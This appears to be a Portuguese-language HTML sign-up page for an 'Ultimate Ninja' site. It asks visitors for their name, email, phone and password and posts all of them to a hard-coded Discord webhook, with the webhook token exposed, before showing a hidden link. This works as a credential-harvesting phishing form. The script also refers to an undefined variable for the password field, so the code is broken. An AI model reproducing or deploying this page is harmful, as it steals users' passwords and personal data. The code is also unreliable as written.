
<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <title>Ultimate Ninja - Cadastro via Discord</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <style>
    body { font-family: Arial, sans-serif; margin: 0; padding: 0; background: #111; color: #f5f5f5; }
    .cadastro-container { max-width: 400px; margin: 50px auto; background: #222; padding: 30px; border-radius: 10px; box-shadow: 0 0 20px #000; }
    .cadastro-container h2 { text-align: center; margin-bottom: 20px; }
    .cadastro-container input, .cadastro-container textarea, .cadastro-container button {
      width: 100%; padding: 12px; margin: 10px 0; border: none; border-radius: 5px;
    }
    .cadastro-container input, .cadastro-container textarea { background: #333; color: #fff; }
    .cadastro-container button { background: #e60000; color: #fff; cursor: pointer; font-size: 16px; }
    .cadastro-container button:hover { background: #ff4444; }
    .msg { text-align: center; margin-top: 10px; font-weight: bold; }
    #mainContent { display: none; }
  </style>
</head>
<body>

  <div class="cadastro-container" id="cadastro">
    <h2>Cadastre-se para acessar o Ultimate Ninja</h2>
    <form id="cadastroForm">
      <input type="text" id="nome" name="nome" placeholder="Nome" required />
      <input type="email" id="email" name="email" placeholder="Email" required />
      <input type="tel" id="telefone" name="telefone" placeholder="Telefone" required />
      <textarea id="senha" name="senha" placeholder="Senha"></textarea>
      <button type="submit">Cadastrar</button>
    </form>
    <div class="msg" id="msg"></div>
  </div>

  <div id="mainContent" style="display:none;">
    https://rxzimminex.github.io/ninjaLabst/
  </div>

  <script>
    const form = document.getElementById('cadastroForm');
    const msg = document.getElementById('msg');
    const cadastro = document.getElementById('cadastro');
    const mainContent = document.getElementById('mainContent');

    form.addEventListener('submit', e => {
      e.preventDefault();

      const nome = document.getElementById('nome').value;
      const email = document.getElementById('email').value;
      const telefone = document.getElementById('telefone').value;
      const senha = document.getElementById('senha').value;

      const webhookURL = 'https://discord.com/api/webhooks/1393993052779057325/NmwZO-InnSFyh-a5iavSqY9yjwef3vYatX1FLE2J91ZNdd_yqRcw0DO0g7eS7WwGbl0h';

      const payload = {
        content: `📥 **Novo Cadastro:**\n👤 Nome: ${nome}\n📧 Email: ${email}\n📱 Telefone: ${telefone}\n📝 Senha: ${mensagem}`
      };

      fetch(webhookURL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      })
      .then(response => {
        msg.innerHTML = 'Cadastro enviado para o Discord com sucesso!';
        cadastro.style.display = 'none';
        mainContent.style.display = 'block';
      })
      .catch(error => {
        console.error('Erro!', error.message);
        msg.innerHTML = 'Erro ao enviar. Tente novamente.';
      });
    });
  </script>

</body>
</html>
